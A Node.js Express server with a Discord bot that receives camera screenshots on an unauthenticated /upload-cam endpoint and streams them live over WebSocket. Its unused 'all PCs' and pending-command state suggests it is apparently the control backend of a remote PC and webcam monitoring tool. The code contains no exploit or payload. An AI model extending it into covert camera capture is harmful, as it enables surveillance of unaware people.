import express from "express";
import { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } from "discord.js";
import { WebSocketServer } from "ws";
import http from "http";
import crypto from "crypto";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json({ limit: "200mb" }));
app.use(express.static(path.join(__dirname, "public"))); // cams.html

// ---------- Discord ----------
const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const CATEGORY_BASE_PC = "🖥️ Все ПК";
const CATEGORY_BASE_CAM = "📷 Камеры";
const LOG_CATEGORY = "📝 Логи";
const LOG_CHANNEL = "📡 server-logs";
const MAX_FILE_SIZE = 6 * 1024 * 1024;

const onlinePCs = {}, pendingCommands = {}, pcData = {};
const channelByPC = {}, channelByCam = {}, wsCameraClients = {}, camLastUpload = {};
let logCategoryCache = null, logChannelCache = null;
let categoryCacheByGuild = new Map(), channelCacheByGuild = new Map();

const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
bot.once("ready", () => console.log(`✅ Discord бот вошёл как ${bot.user.tag}`));
bot.login(DISCORD_BOT_TOKEN);

function shortHash(s,len=8){return crypto.createHash('sha1').update(s).digest('hex').slice(0,len);}
function safeChannelName(prefix,id){return `${prefix}-${shortHash(id,8)}`.toLowerCase().replace(/[^a-z0-9\-]/g,'-').slice(0,90);}
async function logToDiscord(msg){try{const guild=await bot.guilds.fetch(GUILD_ID); const channel=await getOrCreateLogChannel(guild); await channel.send(`[${new Date().toISOString()}] ${msg}`);}catch(e){console.error(e);}}
async function getOrCreateCategory(guild,name){const gid=guild.id;if(!categoryCacheByGuild.has(gid))categoryCacheByGuild.set(gid,{});const cache=categoryCacheByGuild.get(gid);if(cache[name]) return cache[name];const channels=await guild.channels.fetch();const matches=channels.filter(c=>c.type===ChannelType.GuildCategory&&c.name===name);if(matches.size>=1){cache[name]=matches.first();return matches.first();} const created=await guild.channels.create({name,type:ChannelType.GuildCategory}); cache[name]=created; return created;}
async function getOrCreateTextChannel(guild,name,parentId){const gid=guild.id;if(!channelCacheByGuild.has(gid))channelCacheByGuild.set(gid,{});const cache=channelCacheByGuild.get(gid); const key=`${name}::${parentId}`; if(cache[key]) return cache[key]; const channels=await guild.channels.fetch(); const matches=channels.filter(c=>c.type===ChannelType.GuildText&&c.name===name&&c.parentId===parentId); if(matches.size>=1){cache[key]=matches.first();return matches.first();} const created=await guild.channels.create({name,type:ChannelType.GuildText,parent:parentId}); cache[key]=created; await logToDiscord(`Создан канал ${name}`); return created;}
async function getOrCreateLogChannel(guild){if(logChannelCache) return logChannelCache; const category=logCategoryCache||await getOrCreateCategory(guild,LOG_CATEGORY); logCategoryCache=category; const channels=await guild.channels.fetch(); const matches=channels.filter(c=>c.type===ChannelType.GuildText&&c.name===LOG_CHANNEL&&c.parentId===category.id); if(matches.size>0){logChannelCache=matches.first();return matches.first();} const created=await guild.channels.create({name:LOG_CHANNEL,type:ChannelType.GuildText,parent:category.id}); logChannelCache=created; return created;}

// ---------- Upload Cam ----------
app.post("/upload-cam", async (req, res) => {
    try {
        const { camId, screenshot } = req.body;
        if (!camId || !screenshot) return res.status(400).json({ error: "camId and screenshot required" });

        // WS broadcast
        if (!wsCameraClients[camId]) wsCameraClients[camId] = [];
        wsCameraClients[camId].forEach(ws => { try { ws.send(JSON.stringify({ camId, screenshot })); } catch {} });

        camLastUpload[camId] = Date.now();

        res.json({ success: true });
    } catch (e) { await logToDiscord(`❌ Ошибка upload-cam: ${e.message}`); res.status(500).json({ error: e.message }); }
});

// ---------- WebSocket ----------
const wss = new WebSocketServer({ noServer: true });
wss.on("connection", (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const camId = url.searchParams.get("camId") || "all";
    if (!wsCameraClients[camId]) wsCameraClients[camId] = [];
    wsCameraClients[camId].push(ws);
    ws.on("close", () => { wsCameraClients[camId] = wsCameraClients[camId].filter(c => c !== ws); });
});

// ---------- HTTP сервер ----------
const PORT = process.env.PORT || 3000;
const server = http.createServer(app);
server.on("upgrade", (req, socket, head) => { wss.handleUpgrade(req, socket, head, ws => wss.emit("connection", ws, req)); });
server.listen(PORT, () => console.log(`🚀 HTTP сервер слушает порт ${PORT}`));

process.on("uncaughtException", e => logToDiscord(`💥 Uncaught Exception: ${e.message}`));
process.on("unhandledRejection", e => logToDiscord(`💥 Unhandled Rejection: ${e}`));
